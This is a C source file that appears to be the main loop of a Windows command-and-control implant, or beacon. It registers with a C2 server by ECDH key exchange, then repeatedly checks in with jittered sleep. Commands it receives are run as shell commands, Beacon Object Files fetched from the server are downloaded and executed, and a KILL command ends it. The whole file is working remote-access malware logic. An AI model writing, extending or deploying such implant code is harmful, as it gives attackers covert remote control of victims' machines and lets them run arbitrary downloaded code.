#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"
#include "ecdh.h"
#include "http.h"
#include "shell.h"

#define PATH_BUF_SIZE  512
#define AGENT_ID_SIZE  256

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(void) {
    char agent_id[AGENT_ID_SIZE] = {0};

    srand((unsigned int)GetTickCount());

    if (shell_init() != 0) {
        fprintf(stderr, "[!] Failed to allocate output buffer\n");
        return 1;
    }

    // ECDH key exchange + registration (plaintext round-trip to /register)
    if (do_register(agent_id, AGENT_ID_SIZE) != 0) {
        fprintf(stderr, "[!] Registration failed\n");
        shell_cleanup();
        return 1;
    }

    // Initial checkin — sends any startup output, receives first command slot
    char     path[PATH_BUF_SIZE];
    uint8_t *resp     = NULL;
    int      resp_len = 0;
    snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
    http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT, path,
                        (uint8_t *)shell_output_buf(), shell_output_len(),
                        &resp, &resp_len);
    free(resp);
    shell_buf_reset();

    // Main beacon loop
    while (1) {
        snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);

        uint8_t *cmd_plain = NULL;
        int      cmd_len   = 0;

        if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT, path,
                                (uint8_t *)shell_output_buf(), shell_output_len(),
                                &cmd_plain, &cmd_len) == 0 && cmd_plain) {
            shell_buf_reset();

            if (cmd_len > 0) {
                char *cmd = (char *)cmd_plain;
                char *end = cmd + cmd_len - 1;
                while (end >= cmd && (*end == '\r' || *end == '\n' || *end == ' '))
                    *end-- = '\0';

                if (cmd[0] != '\0') {
                    if (strcmp(cmd, "KILL") == 0) {
                        // Server-initiated termination — clean up and exit
                        free(cmd_plain);
                        shell_cleanup();
                        ExitProcess(0);

                    } else if (strncmp(cmd, "BOF:", 4) == 0) {
                        // Format: BOF:<name>:<hex-encoded packed args>
                        char *bof_name = cmd + 4;
                        char *args_hex = strchr(bof_name, ':');
                        if (args_hex) {
                            *args_hex++ = '\0';

                            uint8_t *bof_data = NULL;
                            int      bof_len  = 0;
                            char     bof_path[PATH_BUF_SIZE];
                            snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s",
                                     agent_id, bof_name);

                            if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT,
                                                    bof_path, NULL, 0,
                                                    &bof_data, &bof_len) == 0
                                && bof_data) {
                                int   hex_len  = (int)strlen(args_hex);
                                int   args_len = hex_len / 2;
                                char *args     = malloc(args_len + 1);
                                if (args) {
                                    for (int i = 0; i < args_len; i++) {
                                        unsigned int b;
                                        sscanf(args_hex + i * 2, "%2x", &b);
                                        args[i] = (char)b;
                                    }
                                    execute_bof(bof_data, (size_t)bof_len,
                                                args, args_len);
                                    free(args);
                                }
                                free(bof_data);
                            }
                        } else {
                            beacon_log("[!] Malformed BOF command, missing args separator\n");
                        }

                    } else {
                        execute_shell_command(cmd);
                    }
                }
            }
            free(cmd_plain);
        } else {
            shell_buf_reset();
        }

        DWORD sleep_ms = C2_SLEEP_BASE_MS
                       + (rand() % (C2_SLEEP_JITTER_MS * 2))
                       - C2_SLEEP_JITTER_MS;
        if (sleep_ms < 1000) sleep_ms = 1000;
        Sleep(sleep_ms);
    }

    shell_cleanup();
    return 0;
}